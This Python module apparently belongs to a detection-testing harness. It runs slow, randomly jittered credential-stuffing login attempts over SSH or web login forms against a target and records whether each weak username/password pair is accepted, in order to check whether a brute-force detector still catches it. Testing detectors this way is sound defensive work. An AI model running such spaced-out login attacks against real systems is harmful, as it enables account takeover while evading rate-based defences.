"""Low-and-slow credential stuffing spread over a long window.

Same bounded credential-stuffing logic as credential_stuffing, but single-worker
and spread over a long randomized window. It specifically exercises whether the
*learned* detector (vs. the old fixed-count-per-session rule) still catches a slow
brute force that may span multiple processor cycles or sit near the session
timeout boundary. Non-adaptive: the attempt list is fixed up front.

    python -m attacks.realistic.low_and_slow --target 192.168.50.10 \
        --service ssh --attempts 10 --min-delay 5 --max-delay 20
"""

import argparse
import random

from attacks.runner.run import ExpectedRejection, http_request, ssh_login

from .common import build_summary, jitter_sleep, now_iso, resolve_target, step

EXPECTED_DETECTION = "BRUTE_FORCE"


def _attempt(target: str, service: str, username: str, password: str, number: int) -> dict:
    started = now_iso()
    payload = {"username": username, "password": password}
    try:
        if service == "ssh":
            ssh_login(target, payload)
        else:
            http_request(target, service, {**payload, "auth_mode": "form", "path": "/login"})
        return step(number, service, "completed", started, f"{username}:{password} accepted")
    except ExpectedRejection as exc:
        return step(number, service, "rejected", started, f"{username}:{password} {exc}")
    except Exception as exc:
        return step(number, service, "failed", started, str(exc))


def run(target: str, *, service: str = "ssh", attempts: int = 10, min_delay: float = 5.0, max_delay: float = 20.0, seed: int = 404) -> dict:
    target = resolve_target(target)
    rng = random.Random(seed)
    # Reuse the shared known-weak pairs so attacker and detector agree on "weak".
    from .common import credential_product

    pairs = credential_product(limit=attempts, seed=seed)
    start = now_iso()
    steps = []
    for number, (username, password) in enumerate(pairs, 1):
        if number > 1:
            jitter_sleep(min_delay, max_delay, rng)
        steps.append(_attempt(target, service, username, password, number))
    return build_summary(
        technique="low-and-slow",
        target=target,
        expected_detection=EXPECTED_DETECTION,
        start_time=start,
        steps=steps,
        extra={"service": service, "min_delay": min_delay, "max_delay": max_delay},
    )


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument("--service", default="ssh", choices=("ssh", "camera", "router", "http"))
    parser.add_argument("--attempts", type=int, default=10)
    parser.add_argument("--min-delay", type=float, default=5.0)
    parser.add_argument("--max-delay", type=float, default=20.0)
    parser.add_argument("--seed", type=int, default=404)
    args = parser.parse_args()
    import json

    summary = run(args.target, service=args.service, attempts=args.attempts, min_delay=args.min_delay, max_delay=args.max_delay, seed=args.seed)
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
